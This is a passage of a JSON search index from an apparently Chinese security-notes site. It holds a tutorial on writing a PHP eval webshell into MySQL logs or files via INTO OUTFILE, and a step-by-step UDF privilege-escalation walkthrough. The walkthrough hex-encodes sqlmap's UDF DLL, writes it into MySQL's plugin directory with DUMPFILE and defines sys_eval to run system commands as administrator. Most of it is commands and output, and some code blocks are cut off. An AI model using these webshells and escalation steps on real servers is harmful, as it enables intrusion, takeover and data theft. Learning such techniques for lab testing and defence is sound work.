<li>\u5411\u65e5\u5fd7\u6587\u4ef6\u4e2d\u5199\u5165shell<code>select '&lt;?php @eval($_POST[1]);?&gt;' or sleep(11);</code></li> </ol>"},{"location":"WEB/others/mysql%E5%90%91%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%86%99webshell/#shelloutfile","title":"\u5c06shell\u5199\u5165\u8868\u4e2d+outfile","text":"<p>\u5229\u7528\u6761\u4ef6\uff1a</p> <ol> <li> <p>root\u6743\u9650</p> </li> <li> <p>\u7f51\u7ad9\u7684\u7edd\u5bf9\u8def\u5f84\u4e14\u5177\u6709\u5199\u5165\u6743\u9650</p> </li> </ol> <p>\u6267\u884c\u5982\u4e0b\u8bed\u53e5\u5199\u5165shell\uff1a</p> <ol> <li> <p>\u5c06shell\u63d2\u5165\u4e00\u4e2a\u8868\u4e2d<code>insert into sxss(comment) values ('&lt;?php @eval($_POST[1]);?&gt;');</code></p> </li> <li> <p>\u67e5\u8be2\u8be5\u6570\u636e\u8868\uff0c\u5c06\u7ed3\u679c\u5bfc\u51fa\u6587\u4ef6<code>select comment from sxss into outfile 'D:/shell.php';</code></p> </li> </ol>"},{"location":"WEB/others/mysql%E5%90%91%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%86%99webshell/#cve-2018-19968","title":"CVE-2018-19968\u6587\u4ef6\u5305\u542b","text":"<p>\u53d7\u5f71\u54cd\u7684phpMyAdmin\u7248\u672c\uff1a4.8.0 ~ 4.8.3</p>"},{"location":"WEB/others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/","title":"Sql\u6ce8\u5165\u2014udf \u63d0\u6743","text":"<p>\u672c\u6587\u8bb0\u5f55\u5229\u7528 udf \u5728 windows \u5e73\u53f0\u4e0b\uff08\u7b2c\u516b\u70b9\u4e3aLinux\uff09\u8fdb\u884c\u63d0\u6743\u65f6\u7684\u6574\u4e2a\u8fc7\u7a0b\uff0c\u4ee5\u53ca\u8fc7\u7a0b\u4e2d\u9047\u5230\u7684\u95ee\u9898\u4ee5\u53ca\u7ec6\u8282\u3002</p>"},{"location":"WEB/others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/#udf","title":"\u4e00\u3001\u4ec0\u4e48\u662f udf","text":"<p>udf \u5168\u79f0\u4e3a\uff1auser defined function\uff0c\u610f\u4e3a\u7528\u6237\u81ea\u5b9a\u4e49\u51fd\u6570\uff1b\u7528\u6237\u53ef\u4ee5\u6dfb\u52a0\u81ea\u5b9a\u4e49\u7684\u65b0\u51fd\u6570\u5230 Mysql \u4e2d\uff0c\u4ee5\u8fbe\u5230\u529f\u80fd\u7684\u6269\u5145\uff0c\u8c03\u7528\u65b9\u5f0f\u4e0e\u4e00\u822c\u7cfb\u7edf\u81ea\u5e26\u7684\u51fd\u6570\u76f8\u540c\uff0c\u4f8b\u5982 contact()\uff0cuser()\uff0cversion() \u7b49\u51fd\u6570\u3002</p> <p>udf \u6587\u4ef6\u540e\u7f00\u4e00\u822c\u4e3a dll\uff0c\u7531 C\u3001C++ \u7f16\u5199\u3002</p>"},{"location":"WEB/others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/#udf_1","title":"\u4e8c\u3001udf \u5728\u6e17\u900f\u4e2d\u7684\u4f5c\u7528","text":"<p>\u5728\u4e00\u822c\u6e17\u900f\u8fc7\u7a0b\u4e2d\uff0c\u62ff\u4e0b\u4e00\u53f0 windows \u670d\u52a1\u5668\u7684 webshell \u65f6\uff0c\u7531\u4e8e webshell \u6743\u9650\u8f83\u4f4e\uff0c\u6709\u4e9b\u64cd\u4f5c\u65e0\u6cd5\u8fdb\u884c\uff0c\u800c\u6b64\u65f6\u672c\u5730\u6070\u597d\u5b58\u5728 mysql \u6570\u636e\u5e93\uff0c\u90a3\u4e48 udf \u53ef\u80fd\u5c31\u6d3e\u4e0a\u7528\u573a\u4e86\uff1b\u7531\u4e8e windows \u5b89\u88c5\u7684 mysql \u8fdb\u7a0b\u4e00\u822c\u90fd\u62e5\u6709\u7ba1\u7406\u5458\u6743\u9650\uff0c\u8fd9\u5c31\u610f\u5473\u7740\u7528\u6237\u81ea\u5b9a\u4e49\u7684\u51fd\u6570\u4e5f\u62e5\u6709\u7ba1\u7406\u5458\u6743\u9650\uff0c\u6211\u4eec\u4e5f\u5c31\u62e5\u6709\u4e86\u6267\u884c\u7ba1\u7406\u5458\u547d\u4ee4\u7684\u6743\u9650\uff0c\u8fd9\u65f6\u65b0\u5efa\u7ba1\u7406\u5458\u7528\u6237\u7b49\u64cd\u4f5c\u4e5f\u5c31\u8f7b\u800c\u6613\u4e3e\u4e86\uff0c\u5927\u591a\u6570\u4eba\u79f0\u4e3a\u8fd9\u4e00\u64cd\u4f5c\u4e3a udf \u63d0\u6743\uff0c\u5176\u5b9e\u8868\u8fbe\u4e0d\u591f\u51c6\u786e\uff0c\u5e94\u8be5\u79f0\u4e3a\u901a\u8fc7 mysql \u83b7\u5f97\u7ba1\u7406\u5458\u6743\u9650\u3002</p>"},{"location":"WEB/others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/#udf_2","title":"\u4e09\u3001\u5982\u4f55\u4f7f\u7528udf","text":"<p>\u5047\u8bbe\u6211\u7684 udf \u6587\u4ef6\u540d\u4e3a\u2018udf.dll\u2019\uff0c\u5b58\u653e\u5728 Mysql \u6839\u76ee\u5f55 (\u901a\u8fc7 select @@basedir \u53ef\u77e5) \u7684\u2018lib/plugin\u2019\u76ee\u5f55\u4e0b\u3002\u5728 udf \u4e2d\uff0c\u6211\u5b9a\u4e49\u4e86\u540d\u4e3a sys_eval \u7684 mysql \u51fd\u6570\uff0c\u53ef\u4ee5\u6267\u884c\u7cfb\u7edf\u4efb\u610f\u547d\u4ee4\u3002\u5982\u679c\u6211\u73b0\u5728\u5c31\u6253\u5f00 mysql \u547d\u4ee4\u884c\uff0c\u4f7f\u7528 select sys_eval('dir'); \u7684\u8bdd\uff0c\u7cfb\u7edf\u4f1a\u8fd4\u56de sys_eval()\u51fd\u6570\u672a\u5b9a\u4e49\u3002\u56e0\u4e3a\u6211\u4eec\u4ec5\u4ec5\u662f\u628a\u2018udf.dll\u2019\u653e\u5230\u4e86\u67d0\u4e2a\u6587\u4ef6\u5939\u91cc\uff0c\u5e76\u6ca1\u6709\u5f15\u5165\u3002\u7c7b\u4f3c\u4e8e\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u65f6\u5f15\u5165\u5305\u4e00\u6837\uff0c\u5982\u679c\u6ca1\u6709\u5f15\u5165\u5305\uff0c\u90a3\u4e48\u8fd9\u4e2a\u5305\u91cc\u7684\u7c7b\u4f60\u662f\u7528\u4e0d\u4e86\u7684\u3002 \u6240\u4ee5\uff0c\u6211\u4eec\u5e94\u8be5\u628a\u2018udf.dll\u2019\u4e2d\u7684\u81ea\u5b9a\u4e49\u51fd\u6570\u5f15\u5165\u8fdb\u6765\u3002</p> <p>\u4e0d\u8981\u614c\uff0c\u770b\u770b\u5b9e\u4f8b\u7528\u6cd5\uff1a</p> Text Only<pre><code>CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll';\n</code></pre> <p>\u53ea\u6709\u4e24\u4e2a\u53d8\u91cf\uff0c\u4e00\u4e2a\u662f function_name\uff08\u51fd\u6570\u540d\uff09\uff0c\u6211\u4eec\u60f3\u5f15\u5165\u7684\u51fd\u6570\u662f sys_eval\u3002\u8fd8\u6709\u4e00\u4e2a\u53d8\u91cf\u662f shared_library_name\uff08\u5171\u4eab\u5305\u540d\u79f0\uff09\uff0c\u5373\u2018udf.dll\u2019\u3002 \u81f3\u6b64\u6211\u4eec\u5df2\u7ecf\u5f15\u5165\u4e86 sys_eval \u51fd\u6570\uff0c\u4e0b\u9762\u5c31\u662f\u4f7f\u7528\u4e86\u3002 \u8fd9\u4e2a\u51fd\u6570\u7528\u4e8e\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\uff0c\u7528\u6cd5\u5982\u4e0b\uff1a</p> Text Only<pre><code>select sys_eval('cmd command');\n</code></pre> <p>\u73b0\u5728\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86 udf \u662f\u4ec0\u4e48\uff0c\u4ee5\u53ca\u5982\u4f55\u5f15\u5165 udf\u3002\u4e0b\u9762\u6211\u4eec\u8981\u5173\u6ce8\u7684\u5c31\u662f\u63d0\u6743\u4e86\u3002\u5176\u5b9e\u5230\u8fd9\u91cc\uff0c\u63d0\u6743\u5df2\u7ecf\u7ed3\u675f\u4e86\uff0c\u56e0\u4e3a\u5bf9\u4e8e sys_eval() \u51fd\u6570\uff0c\u5176\u4e2d\u7684\u6307\u4ee4\u662f\u76f4\u63a5\u4ee5\u7ba1\u7406\u5458\u7684\u6743\u9650\u8fd0\u884c\u7684\uff0c\u6240\u4ee5\u8fd9\u4e5f\u5c31\u662f\u6700\u9ad8\u6743\u9650\u4e86\u3002 \u4e0b\u9762\u6765\u6574\u7406\u4e00\u4e0b\u601d\u8def\uff1a</p> <ol> <li>\u5c06 udf \u6587\u4ef6\u653e\u5230\u6307\u5b9a\u4f4d\u7f6e\uff08Mysql&gt;5.1 \u653e\u5728 Mysql \u6839\u76ee\u5f55\u7684 lib\\plugin \u6587\u4ef6\u5939\u4e0b\uff09</li> <li>\u4ece udf \u6587\u4ef6\u4e2d\u5f15\u5165\u81ea\u5b9a\u4e49\u51fd\u6570 (user defined function)</li> <li>\u6267\u884c\u81ea\u5b9a\u4e49\u51fd\u6570</li> </ol>"},{"location":"WEB/others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/#_1","title":"\u56db\u3001\u5229\u7528\u6761\u4ef6","text":"<p>\u5229\u7528 udf \u7684\u6761\u4ef6\u5176\u5b9e\u8fd8\u662f\u633a\u82db\u523b\u7684</p>"},{"location":"WEB/others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/#1-mysql","title":"1. mysql \u7528\u6237\u6743\u9650\u95ee\u9898","text":"<p>\u9700\u8981mysql\u914d\u7f6e\u6587\u4ef6secure_file_priv\u9879\u8bbe\u7f6e\u4e3a\u7a7a</p> <p>\u83b7\u5f97\u4e00\u4e2a\u6570\u636e\u5e93\u8d26\u53f7\uff0c\u62e5\u6709\u5bf9 MySQL \u7684 insert \u548c delete \u6743\u9650\u3002\u4ee5 root \u4e3a\u4f73\u3002</p> <p>\u62e5\u6709\u5c06 udf.dll \u5199\u5165\u76f8\u5e94\u76ee\u5f55\u7684\u6743\u9650\u3002</p>"},{"location":"WEB/others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/#2","title":"2. \u6570\u636e\u5e93\u7248\u672c\u95ee\u9898","text":"<p>udf \u5229\u7528\u7684\u5176\u4e2d\u4e00\u6b65\uff0c\u662f\u8981\u5c06\u6211\u4eec\u7684 xxx.dll \u6587\u4ef6\u4e0a\u4f20\u5230 mysql \u68c0\u7d22\u76ee\u5f55\u4e2d\uff0cmysql \u5404\u7248\u672c\u7684\u68c0\u7d22\u76ee\u5f55\u6709\u6240\u4e0d\u540c\uff1a</p> \u7248\u672c\u8def\u5f84MySQL &lt; 5.0\u5bfc\u51fa\u8def\u5f84\u968f\u610f\uff1b5.0 &lt;= MySQL&lt; 5.1\u9700\u8981\u5bfc\u51fa\u81f3\u76ee\u6807\u670d\u52a1\u5668\u7684\u7cfb\u7edf\u76ee\u5f55\uff08\u5982\uff1ac:/windows/system32/\uff095.1 &lt; MySQL\u5fc5\u987b\u5bfc\u51fa\u5230 MySQL \u5b89\u88c5\u76ee\u5f55\u4e0b\u7684 lib\\plugin \u6587\u4ef6\u5939\u4e0b <p>\u4e00\u822c Lib\u3001Plugin \u6587\u4ef6\u5939\u9700\u8981\u624b\u5de5\u5efa\u7acb\uff08\u53ef\u7528 NTFS ADS \u6d41\u6a21\u5f0f\u7a81\u7834\u8fdb\u800c\u521b\u5efa\u6587\u4ef6\u5939\uff09</p>"},{"location":"WEB/others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/#_2","title":"\u4e94\u3001\u5229\u7528\u8fc7\u7a0b","text":"<p>\u73af\u5883\uff1a</p> <p>\u76ee\u6807\u7cfb\u7edf\uff1awindows 10</p> <p>mysql \u7248\u672c\uff1a5.5.53</p>"},{"location":"WEB/others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/#1","title":"1\u3001\u67e5\u770b\u7248\u672c","text":"Text Only<pre><code>mysql&gt; select version();\n+-----------+\n| version() |\n+-----------+\n| 5.5.53    |\n+-----------+\n1 row in set (0.00 sec)\n</code></pre>"},{"location":"WEB/others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/#2-mysql","title":"2\u3001\u83b7\u53d6 Mysql \u5b89\u88c5\u8def\u5f84","text":"Text Only<pre><code>mysql&gt; select @@basedir;\n+--------------------------------+\n| @@basedir                      |\n+--------------------------------+\n| C:/phpStudy/PHPTutorial/MySQL/ |\n+--------------------------------+\n1 row in set (0.00 sec)\n</code></pre>"},{"location":"WEB/others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/#3","title":"3\u3001\u67e5\u770b\u7528\u6237\u6743\u9650","text":"Text Only<pre><code>mysql&gt; select * from mysql.user where user = substring_index(user(), '@', 1)\\G;\n\n\u6216\u8005\n\nmysql&gt; select * from mysql.user where user='root' and host='127.0.0.1' \\G;\n*************************** 1. row ***************************\n                  Host: 127.0.0.1\n                  User: root\n              Password: *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B\n           Select_priv: Y\n           Insert_priv: Y\n           Update_priv: Y\n           Delete_priv: Y\n           Create_priv: Y\n             Drop_priv: Y\n           Reload_priv: Y\n         Shutdown_priv: Y\n          Process_priv: Y\n             File_priv: Y\n            Grant_priv: Y\n       References_priv: Y\n            Index_priv: Y\n            Alter_priv: Y\n          Show_db_priv: Y\n            Super_priv: Y\n Create_tmp_table_priv: Y\n      Lock_tables_priv: Y\n          Execute_priv: Y\n       Repl_slave_priv: Y\n      Repl_client_priv: Y\n      Create_view_priv: Y\n        Show_view_priv: Y\n   Create_routine_priv: Y\n    Alter_routine_priv: Y\n      Create_user_priv: Y\n            Event_priv: Y\n          Trigger_priv: Y\nCreate_tablespace_priv: Y\n              ssl_type:\n            ssl_cipher:\n           x509_issuer:\n          x509_subject:\n         max_questions: 0\n           max_updates: 0\n       max_connections: 0\n  max_user_connections: 0\n                plugin:\n authentication_string:\n1 row in set (0.01 sec)\n</code></pre> <p>\u53ef\u89c1 root \u7528\u6237\u62e5\u6709\u4ee5\u4e0b\u5173\u952e\u6743\u9650\uff0c\u5e76\u4e14\u53ef\u8bfb\u5199\u6587\u4ef6\u3002</p> <p>Insert_priv: Y Update_priv: Y Delete_priv: Y File_priv: Y</p>"},{"location":"WEB/others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/#4","title":"4\u3001\u67e5\u770b\u53ef\u64cd\u4f5c\u8def\u5f84","text":"Text Only<pre><code>mysql&gt; show global variables like '%secure%';\n+------------------+-------+\n| Variable_name    | Value |\n+------------------+-------+\n| secure_auth      | OFF   |\n| secure_file_priv | NULL  |\n+------------------+-------+\n2 rows in set (0.00 sec)\n</code></pre> <p>secure_file_priv \u503c\u4e3a null\uff0c\u8868\u793a mysql \u4e0d\u5141\u8bb8\u5bfc\u5165\u5bfc\u51fa\uff0c\u6b64\u65f6\u6211\u4eec\u53ea\u6709\u901a\u8fc7\u522b\u7684\u65b9\u6cd5\u5c06 udf.dll \u5199\u5165\u5b89\u88c5\u8def\u5f84\u3002</p>"},{"location":"WEB/others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/#5mysqludf","title":"5\u3001\u901a\u8fc7\u4e3b\u673a\u7248\u672c\u53ca\u67b6\u6784\u786e\u8ba4mysql\u4f4d\u6570\u6765\u9009\u7528udf\u6587\u4ef6","text":"Text Only<pre><code>mysql&gt; show variables like '%compile%';\n+-------------------------+-------+\n| Variable_name           | Value |\n+-------------------------+-------+\n| version_compile_machine | AMD64 |\n| version_compile_os      | Win32 |\n+-------------------------+-------+\n2 rows in set (0.00 sec)\n</code></pre>"},{"location":"WEB/others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/#6-dll","title":"6\u3001\u4e0a\u4f20 DLL \u5e76\u5229\u7528","text":""},{"location":"WEB/others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/#61-plugin","title":"6.1\u3001\u521b\u5efa plugin \u76ee\u5f55","text":"<p>\u8fd9\u91cc\u4f7f\u7528 ntfs \u6570\u636e\u6d41\u521b\u5efa\uff0c\u4f46\u662f\u6211\u672c\u5730\u6d4b\u8bd5\u4e00\u76f4\u6ca1\u6709\u6210\u529f\u3002</p> <p>ADS\u6587\u4ef6\u6d41\u662fNTFS\u6587\u4ef6\u7cfb\u7edf\u4e3a\u4e86\u80fd\u4e0eMac\u7cfb\u7edf\u4e0b\u7684HFS\u6587\u4ef6\u7cfb\u7edf\u517c\u5bb9\u800c\u8bbe\u8ba1\u51fa\u7684\u3002</p> <p>\u7ecf\u5b9e\u8df5\u5728\u547d\u4ee4\u63d0\u793a\u7b26\u4e0b\u4f7f\u7528ADS\u6587\u4ef6\u6d41\u662f\u53ef\u4ee5\u6210\u529f\u521b\u5efa\u76ee\u5f55\u6216\u8005\u6587\u4ef6\u540d\u7684\uff0c\u4f46\u5728\u72ec\u7acb\u5b89\u88c5\u7684mysql\u6570\u636e\u5e93\u73af\u5883\u4e0ephpstudy\u81ea\u5e26mysql\u73af\u5883\u4e0b\u5747\u521b\u5efa\u5931\u8d25\uff0c\u5e76\u4e14\u67e5\u9605\u7f51\u4e0a\u5404\u79cd\u6587\u7ae0\u4e5f\u90fd\u662f\u6ca1\u6709\u5229\u7528\u6210\u529f\u7684\uff0c\u4e25\u91cd\u6000\u7591\u662f\u54ea\u4f4d\u5c0f\u53ef\u7231\u81c6\u60f3\u51fa\u6765\u7684\uff0c\u4f46\u4e3a\u4e86\u6587\u7ae0\u5b8c\u6574\u6027\u8fd8\u662f\u51b3\u5b9a\u5199\u51fa\u6765\u3002\u5728 t00ls \u4e0a\u4e5f\u6709\u4eba\u8bf4\u6570\u636e\u6d41\u4ece\u6765\u6ca1\u6709\u6210\u529f\u8fc7\uff0c\u6240\u4ee5\u8bf4 mysql5.1 \u4ee5\u4e0a\u7684\u63d0\u6743\u80fd\u5426\u6210\u529f\u8fd8\u662f\u4e2a\u8ff7\u3002</p> Text Only<pre><code>Mysql\u6570\u636e\u5e93\u4e2d\u62a5\u9519\uff1a\nmysql&gt; select 'test' into dumpfile 'C:\\\\phpStudy\\\\PHPTutorial\\\\MySQL\\\\lib\\\\plugin::$INDEX_ALLOCATION';\nERROR 1 (HY000): Can't create/write to file 'C:\\phpStudy\\PHPTutorial\\MySQL\\lib\\plugin::$INDEX_ALLOCATION' (Errcode: 13)\n</code></pre> <p>\u4e3a\u540e\u7eed\u6d4b\u8bd5\uff0c\u624b\u52a8\u521b\u5efa plugin \u76ee\u5f55</p>"},{"location":"WEB/others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/#62-dll","title":"6.2\u3001\u5c06 dll \u4e0a\u4f20\u5230\u5b89\u88c5\u8def\u5f84\u7684\u65b9\u5f0f\uff1a","text":"<p>\u901a\u8fc7 webshell \u4e0a\u4f20</p> <p>\u4ee5 hex \u65b9\u5f0f\u76f4\u63a5\u4e0a\u4f20</p> <p>sqlmap \u4e2d\u6709\u73b0\u6210\u7684 udf \u6587\u4ef6\uff0c\u5206\u4e3a 32 \u4f4d\u548c 64 \u4f4d\uff0c\u4e00\u5b9a\u8981\u9009\u62e9\u5bf9\u7248\u672c\uff0c\u5426\u5219\u4f1a\u663e\u793a\uff1aCan't open shared library'udf.dll'\u3002</p> <p>sqlmap\u4e2d\uff1asqlmap\\data\\udf\\mysql</p> <p>metaspliot\u4e2d\uff1a/usr/share/metasploit-framework/data/exploits/mysql</p> <p>\u5f53mysql\u5927\u4e8e5.1\u7248\u672c\u65f6\uff1a\u67e5\u770b plugin \u76ee\u5f55\uff0c\u5b58\u5728lib\\plugin\u76ee\u5f55\u4e14\u6709webshell\u65f6\uff0c\u76f4\u63a5\u4e0a\u4f20udf\u6587\u4ef6\u3002\u5b58\u5728lib\\plugin\u76ee\u5f55\u4f46\u6ca1\u6709webshell\u65f6\uff0c\u5219\u9700\u8981\u4ee516\u8fdb\u5236\u7f16\u7801\u5199\u5165udf\u6587\u4ef6\u3002</p> <p>\u9996\u5148\u5c06\u5bf9\u5e94\u7248\u672c\u7684udf\u6587\u4ef6\u8fdb\u884c16\u8fdb\u5236\u7f16\u7801\uff08sqlmap\u4e2d\u7684udf\u6587\u4ef6\u4e3a\u9632\u6b62\u8bef\u6740\u9ed8\u8ba4\u662f\u7ecf\u8fc7\u5f02\u6216\u7f16\u7801\u7684\uff0c\u9700\u5148\u4f7f\u7528sqlmap\u81ea\u5e26\u7684\u811a\u672c\u89e3\u7801\uff09\u3002</p> Text Only<pre><code>sqlmap udf\u6587\u4ef6\u89e3\u7801\npython extra/cloak/cloak.py -d -i data/udf/mysql/windows/32/lib_mysqludf_sys.dll_;\n\u63a5\u7740\u5c31\u4f1a\u5728\\sqlmap\\data\\udf\\mysql\\windows\\32\u76ee\u5f55\u4e0b\u751f\u6210\u4e00\u4e2adll\u7684\u6587\u4ef6lib_mysqludf_sys.dll\uff0c\u8fd9\u4e2a\u6211\u4eec\u5c31\u53ef\u4ee5\u76f4\u63a5\u62ff\u6765\u5229\u7528\n</code></pre>"},{"location":"WEB/others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/#6316udfdumpfileoutfiledumpfile","title":"6.3\u3001\u5c0616\u8fdb\u5236\u7f16\u7801\u540eudf\u6587\u4ef6\u4f7f\u7528dumpfile\u51fd\u6570\u5199\u5165\u78c1\u76d8\uff08outfile\u5bfc\u51fa\u6587\u4ef6\u4f1a\u5728\u672b\u5c3e\u5199\u5165\u65b0\u884c\u4e14\u8f6c\u4e49\u6362\u884c\u7b26\uff0c\u7834\u574f\u4e8c\u8fdb\u5236\u6587\u4ef6\u7ed3\u6784\uff0cdumpfile\u4e0d\u4f1a\u8fdb\u884c\u4efb\u4f55\u64cd\u4f5c\uff09\u3002","text":"<p>\u4e3a\u4e86\u5c06\u8fd9\u4e2a\u8f6c\u6362\u4e3a\u5341\u516d\u8fdb\u5236\uff0c\u53ef\u4ee5\u501f\u52a9mysql\u4e2d\u7684hex\u51fd\u6570\uff0c\u5148\u5c06udf.dll\u79fb\u52a8\u5230C\u76d8\u4e2d\uff0c\u8fd9\u6837\u8def\u5f84\u4e5f\u6e05\u6670\u4e00\u4e9b\uff0c\u7136\u540e\u6267\u884c\u4e0b\u9762\u547d\u4ee4</p> Text Only<pre><code>16\u8fdb\u5236\u7f16\u7801udf\u6587\u4ef6\nselect hex(load_file('C:\\\\udf.dll')) into dumpfile 'C:\\\\lib_mysqludf_sys_32.txt';\n\u6210\u529f\u751f\u6210\u4e86\u5341\u516d\u8fdb\u5236\u5f62\u5f0f\u6d41\n</code></pre>"},{"location":"WEB/others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/#64-udf16-webshell","title":"6.4\u3001\u63a5\u4e0b\u6765\u5c31\u662f\u628a\u672c\u5730\u7684 udf16 \u8fdb\u5236\u5f62\u5f0f\u901a\u8fc7\u6211\u4eec\u5df2\u7ecf\u83b7\u5f97\u7684 webshell \u4f20\u5230\u76ee\u6807\u4e3b\u673a\u4e0a\u3002","text":"Text Only<pre><code>1. CREATE TABLE udftmp (abc longblob); //\u65b0\u5efa\u4e00\u4e2a\u8868\uff0c\u540d\u4e3audftmp\uff0c\u7528\u4e8e\u5b58\u653e\u672c\u5730\u4f20\u6765\u7684udf\u6587\u4ef6\u7684\u5185\u5bb9\u3002\n2. INSERT INTO udftmp values(unhex('udf\u6587\u4ef6\u768416\u8fdb\u5236\u683c\u5f0f')); //\u5728udftmp\u4e2d\u5199\u5165udf\u6587\u4ef6\u5185\u5bb9\n3. SELECT abc FROM udftmp INTO DUMPFILE 'D:\\\\PHPStudy\\\\PHPTutorial\\\\MySQL\\\\lib\\\\plugin\\\\udf.dll'; //\u5c06udf\u6587\u4ef6\u5185\u5bb9\u4f20\u5165\u65b0\u5efa\u7684udf\u6587\u4ef6\u4e2d\uff0c\u8def\u5f84\u6839\u636e\u81ea\u5df1\u7684@@basedir\u4fee\u6539\n//\u5bf9\u4e8emysql\u5c0f\u4e8e5.1\u7684\uff0c\u5bfc\u51fa\u76ee\u5f55\u4e3aC:\\Windows\\\u6216C:\\Windows\\System32\\\n</code></pre> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff1a\u5982\u679c\u5728\u4f4e\u7248\u672c\u7cfb\u7edf\u73af\u5883\u4e0b\uff08win2003\uff09\u6216\u90e8\u5206\u7279\u6b8a\u73af\u5883\u4f7f\u7528mysql\u547d\u4ee4\u63d0\u793a\u7b26\u8fdb\u884c\u63d0\u6743\u64cd\u4f5c\uff0c\u7531\u4e8e\u4e0d\u540c\u73af\u5883\u4e0b\u7684mysql\u547d\u4ee4\u63d0\u793a\u7b26\u53ef\u8f93\u5165\u5b57\u7b26\u6700\u5927\u957f\u5ea6\u4e0d\u540c\uff08win2003\u4e3a8191\uff0cwin10\u7cfb\u7edf\u4e3a65535\uff09\uff0c\u65e0\u6cd5\u4f7f\u7528dumpfile\u4e00\u6b21\u6027\u5199\u5165\u5168\u90e816\u8fdb\u5236\u5b57\u7b26\uff0c\u5219\u9700\u8981\u5c06udf\u6587\u4ef6\u768416\u8fdb\u5236\u7f16\u7801\u5b57\u7b26\u5148\u8fdb\u884c\u5207\u5272\uff0c\u518d\u62fc\u63a5\u5199\u5165\u5230\u4e00\u4e2a\u8868\u4e2d\uff0c\u6700\u540e\u5bfc\u51fa\u5230\u76ee\u6807\u7cfb\u7edf\u3002</p> <p>\u6ce8\u610f\uff1a\u5728\u8fdb\u884c16\u8fdb\u5236\u6570\u636e\u5207\u5272\u65f6\uff0c\u6bcf\u6bb5\u5b57\u7b26\u7684\u957f\u5ea6\u8981\u4e3a4\u7684\u500d\u6570\uff0c2\u8fdb\u5236\u8f6c\u4e3a16\u8fdb\u5236\u4f7f\u7528\u53d6\u56db\u5408\u4e00\u6cd5\uff0c\u5982\u679c\u4f4d\u6570\u4e0d\u591f\u4f1a\u5728\u6700\u9ad8\u4f4d\u88650\uff0c\u88650\u540e\u4f1a\u7834\u574f\u539f\u59cb\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u6587\u4ef6\u7ed3\u6784\u5bfc\u81f4\u5229\u7528\u5931\u8d25\uff0c\u8fd9\u4e5f\u662f\u5f88\u591a\u4eba\u6b64\u65b9\u6cd5\u590d\u73b0\u5931\u8d25\u7684\u539f\u56e0\u3002</p>"},{"location":"WEB/others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/#64132","title":"6.4.1\u300132\u4f4d\u63d2\u5165\u7b2c\u4e00\u6bb5\u6570\u636e\uff1a","text":"Text Only<pre><code>insert into udftmp(abc) values (0xn</code></pre>"},{"location":"WEB/others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/#64232update","title":"6.4.2\u300132\u4f4dupdate\u62fc\u63a5\u5269\u4f59\u6570\u636e","text":"Text Only<pre><code>update udftmp set abc = concat(abc,0xn</code></pre>"},{"location":"WEB/others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/#64364","title":"6.4.3\u300164\u4f4d\u63d2\u5165\u7b2c\u4e00\u6bb5\u6570\u636e\uff1a","text":"Text Only<pre><code>insert into udftmp(abc) values (0xn</code></pre>"},{"location":"WEB/others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/#64464update","title":"6.4.4\u300164\u4f4dupdate\u62fc\u63a5\u5269\u4f59\u6570\u636e","text":"Text Only<pre><code>update udftmp set abc = concat(abc,0xn</code></pre>"},{"location":"WEB/others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/#65","title":"6.5\u3001\u5bfc\u51fa\u8868\u4e2d\u6570\u636e\u5230\u7cfb\u7edf\u78c1\u76d8","text":"<p>\u5c06udf\u6587\u4ef6\u5185\u5bb9\u4f20\u5165\u65b0\u5efa\u7684udf\u6587\u4ef6\u4e2d\uff0c\u8def\u5f84\u6839\u636e\u81ea\u5df1\u7684@@plugin_dir\u4fee\u6539 //\u5bf9\u4e8emysql\u5c0f\u4e8e5.1\u7684\uff0c\u5bfc\u51fa\u76ee\u5f55\u4e3aC:\\Windows\\\u6216C:\\Windows\\System32\\</p> Text Only<pre><code>select abc from udf into dumpfile \"C:\\\\Program Files\\\\MySQL\\\\MySQL Server 5.5\\\\lib\\\\plugin\\\\udf.dll\";\n\u5c31\u662f\uff086.4\uff09\u7684\u6700\u540e\u4e00\u70b9\uff083\uff09\n</code></pre> <p>\u7ee7\u7eed\uff0c\u5230\u8fd9\u513f\u5982\u679c\u6ca1\u6709\u62a5\u9519\u7684\u8bdd\u5c31\u8bf4\u660e\u5df2\u7ecf\u5728\u76ee\u6807\u4e3b\u673a\u4e0a\u6210\u529f\u751f\u6210\u4e86 udf \u6587\u4ef6\u3002\u4e0b\u9762\u8981\u5bfc\u5165 udf \u51fd\u6570\uff1a</p> Text Only<pre><code>DROP TABLE udftmp; 